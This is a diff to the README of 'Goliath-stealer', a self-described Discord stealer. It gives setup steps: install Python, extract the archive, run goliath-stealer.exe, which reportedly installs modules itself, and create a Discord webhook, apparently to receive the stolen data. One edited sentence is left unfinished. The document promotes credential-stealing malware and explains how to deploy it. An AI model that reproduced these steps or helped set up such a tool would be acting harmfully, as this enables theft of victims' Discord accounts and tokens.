@@ -1,4 +1,4 @@
-                                                                                                               ☣GOLIATH⚔
+                                                                                                               
 # Goliath-stealer
 This is the best discord stealer ever made
 
@@ -12,10 +12,9 @@ Make sure you have Python 3.11+ installed and it is added to your path.
    
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 
-3. Open The goliath-stealer-setup.py File:
+3. Open The goliath-stealer.exe File:
 
-You dont need to manually install any modules. Just opening goliath-stealer-setup.py will install them for you. If successfull the goliath-stealer-setup.py will then open up the stealer gui.
-
+You dont need to manually install any modules. Just opening goliath-stealer.exe will install them for you. If successfull the goliath-stealer.exe
 4. Create A Webhook:
 
 If you don't know how to make a webhook you can follow this guide: https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
